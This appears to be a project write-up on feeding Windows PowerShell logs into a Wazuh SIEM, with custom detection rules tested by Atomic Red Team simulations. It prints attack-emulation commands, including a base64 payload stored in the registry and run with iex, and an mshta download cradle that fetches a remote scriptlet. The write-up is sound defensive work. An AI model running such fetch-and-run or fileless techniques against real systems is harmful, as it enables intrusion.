# ðŸ§ª PowerShell Log Source Integration with Wazuh â€“ Sprint 11 Project

## Project Overview

This Sprint 11 project demonstrates the integration of Windows PowerShell Operational logs into a Wazuh SIEM deployment. By enabling native PowerShell logging features and writing custom detection rules, I achieved comprehensive visibility into advanced attacker techniquesâ€”such as obfuscated payloads, fileless execution, and mshta-based download cradlesâ€”using Atomic Red Team simulations.

**Role:** Detection Engineer / SOC Analyst
**Duration:** 1 week
**Environment:** CloudShare VMs (AD01, ART Workstation)
**Tools:** Wazuh, Windows EventChannel, Group Policy, Atomic Red Team, Kibana, PowerShell

---

## Key Modifications

1. **Group Policy Configuration**

   * Enabled **Script Block Logging** (Event ID 4104)
   * Enabled **Module Logging** (Event ID 4103)
   * (Optional) Enabled Transcription Logging for session records

2. **Wazuh Agent Setup**

   * Updated `ossec.conf` on AD01 to ingest `Microsoft-Windows-PowerShell/Operational` logs via `eventchannel`
   * Restarted `wazuh-agent` service to apply changes

3. **Custom Detection Rules**

   * Created rules in `local_rules.xml` on Wazuh Manager for `win.system.providerName == Microsoft-Windows-PowerShell`
   * Alerting on critical event IDs: `4104`, `4103`, `4688`

4. **Validation & Testing**

   * Executed three Atomic Red Team tests (T1027, Fileless Script, mshta Download Cradle)
   * Verified log ingestion and alerts via Kibana dashboard filters

## Experiments & Findings

### Experiment 1 â€“ T1027: Obfuscated Files or Information

**Objective:** Detect base64-encoded PowerShell commands.
**Execution:**

```powershell
$sess = New-PSSession -ComputerName AD01 -Credential (Get-Credential)
Invoke-AtomicTest T1027 -Session $sess
Invoke-AtomicTest T1027 -Session $sess -Cleanup
```

**Findings:**

* Event ID 4104 captured decoded script blocks containing `FromBase64String` and `IEX`.
* Event ID 4103 logged module usage (`System.Text.Encoding`).
* Event ID 4688 showed the PowerShell process creation.

### Experiment 2 â€“ PowerShell Fileless Script Execution

**Objective:** Simulate fileless registry-based payload.
**Execution:**

```powershell
Invoke-Command -Session $sess -ScriptBlock {
  reg.exe add "HKCU:\Software\Classes\AtomicRedTeam" /v ART /t REG_SZ /d "<Base64>" /f
}
Invoke-Command -Session $sess -ScriptBlock {
  iex ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String((gp 'HKCU:\Software\Classes\AtomicRedTeam').ART)))
}
Invoke-Command -Session $sess -ScriptBlock {
  Remove-Item -Path "C:\Windows\Temp\art-marker.txt" -Force
  Remove-Item -Path "HKCU:\Software\Classes\AtomicRedTeam" -Force
}
```

**Findings:**

* 4104 logged decoded block writing `art-marker.txt`.
* 4103 tracked `[Convert]` and `[Text.Encoding]` usage.
* 4688 confirmed in-memory execution without intermediary files.

### Experiment 3 â€“ PowerShell Invoke mshta.exe Download Cradle

**Objective:** Emulate a download cradle via `mshta.exe`.
**Execution:**

```powershell
Invoke-Command -Session $sess -ScriptBlock {
  cmd.exe /c "mshta.exe javascript:a=GetObject('script:https://.../mshta.sct').Exec();close()"
}
```

**Findings:**

* 4104 captured the script block with success message.
* 4688 revealed process tree: `cmd.exe` â†’ `mshta.exe` â†’ `powershell.exe`.
* 4103 optionally logged COM interactions.

## Conclusion & Lessons Learned

* **Visibility Gaps:** Sysmon alone missed critical PowerShell activity; enabling native logging was essential.
* **Detection Engineering:** Custom Wazuh rules successfully alerted on advanced techniques.
* **Validation Approach:** Real-world ATT\&CK simulations validated end-to-end logging and detection.
